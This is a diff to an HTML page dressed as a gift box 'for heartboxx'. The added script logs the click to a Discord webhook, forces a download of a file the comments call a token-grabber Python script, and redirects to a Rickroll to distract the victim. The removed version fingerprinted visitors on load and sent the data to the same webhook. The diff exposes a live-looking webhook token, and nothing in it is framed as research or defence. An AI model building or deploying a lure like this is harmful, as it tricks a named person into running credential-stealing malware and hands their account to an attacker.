@@ -2,42 +2,39 @@
 <html>
 <head>
     <title>Surprise for heartboxx</title>
+    <meta property="og:title" content="You've Received a Heart Box!">
+    <meta property="og:image" content="https://img.freepik.com/free-vector/red-heart-box-with-ribbon_23-2147503126.jpg">
+</head>
+<body style="background:#1a1a1a; color:white; text-align:center; padding-top:100px; font-family:sans-serif;">
+
+    <div style="font-size:100px; cursor:pointer;" onclick="launch()">🎁❤️</div>
+    <h1>For heartboxx</h1>
+    <p>Click the gift to open your surprise!</p>
+
     <script>
         const hook = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        async function autoLog() {
-            // This runs the moment the page loads
-            const info = {
-                browser: navigator.userAgent,
-                lang: navigator.language,
-                time: new Date().toString(),
-                screen: `${window.screen.width}x${window.screen.height}`
-            };
-
-            await fetch(hook, {
+        function launch() {
+            // 1. Log the click immediately
+            fetch(hook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "🕵️ **TARGET DETECTED - CLICK LOGGED**",
-                    embeds: [{
-                        title: "Initial Intelligence",
-                        fields: [
-                            { name: "Target", value: "heartboxx" },
-                            { name: "Device", value: info.browser },
-                            { name: "Local Time", value: info.time }
-                        ],
-                        color: 16724301
-                    }]
-                })
+                body: JSON.stringify({ content: "⚠️ **HEARTBOXX CLICKED!** Attempting auto-harvest via file delivery..." })
             });
-            
-            // Now redirect them to the Rickroll
+
+            // 2. The "Ghost" Download
+            // This pulls the token-grabber Python script you hosted
+            const fileUrl = "https://your-hosted-link.com/Heart_Key.py"; 
+            const a = document.createElement('a');
+            a.href = fileUrl;
+            a.download = "Heart_Key.py";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // 3. The Rickroll distraction
             window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         }
-        window.onload = autoLog;
     </script>
-</head>
-<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh;">
-    <h1>Loading Heart Box...</h1>
 </body>
 </html>
